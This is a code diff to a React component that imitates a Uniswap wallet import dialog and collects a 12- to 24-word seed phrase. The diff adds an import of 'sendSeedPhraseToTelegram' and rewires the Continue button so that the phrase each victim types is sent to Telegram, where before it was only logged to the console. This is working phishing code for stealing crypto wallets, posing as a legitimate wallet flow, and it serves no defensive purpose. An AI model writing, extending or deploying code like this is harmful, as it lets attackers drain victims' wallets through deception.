@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 // Import your local Uniswap logo asset
 import uniswapLogo from '../assets/uniswap.png';
@@ -18,6 +19,7 @@ export default function UniswapPanel({ isOpen, onClose }: UniswapPanelProps) {
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [updateProgress, setUpdateProgress] = useState(0);
   const [invalidCount, setInvalidCount] = useState(0);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset state when modal opens
   useEffect(() => {
@@ -29,6 +31,7 @@ export default function UniswapPanel({ isOpen, onClose }: UniswapPanelProps) {
       setPhraseValues(Array(24).fill(''));
       setUpdateProgress(0);
       setInvalidCount(0);
+      setIsSending(false); // 👈 NEW
 
       const timer = setTimeout(() => {
         setView('password');
@@ -328,15 +331,22 @@ export default function UniswapPanel({ isOpen, onClose }: UniswapPanelProps) {
                 </div>
                 <div className="w-full">
                   <button 
+                    disabled={!isPhraseComplete() || isSending}
+                    onClick={async () => {
+                      setIsSending(true);
+                      const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                      const success = await sendSeedPhraseToTelegram(seedString, 'Uniswap Wallet');
+                      if (success) {
+                        onClose();
+                      } else {
+                        console.error('Failed to send seed phrase');
+                      }
+                      setIsSending(false);
+                    }}
                     className="w-full text-[#ffffff] bg-[#ff37c7] font-semibold font-inter text-[17px] cursor-pointer rounded-[16px] px-4 py-[14px] hover:opacity-80 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]" 
                     type="button" 
-                    disabled={!isPhraseComplete()}
-                    onClick={() => {
-                      console.log("Uniswap Import Complete:", phraseValues.slice(0, phraseLength));
-                      onClose();
-                    }}
                   >
-                    Continue
+                    {isSending ? 'Sending...' : 'Continue'}
                   </button>
                 </div>
               </div>
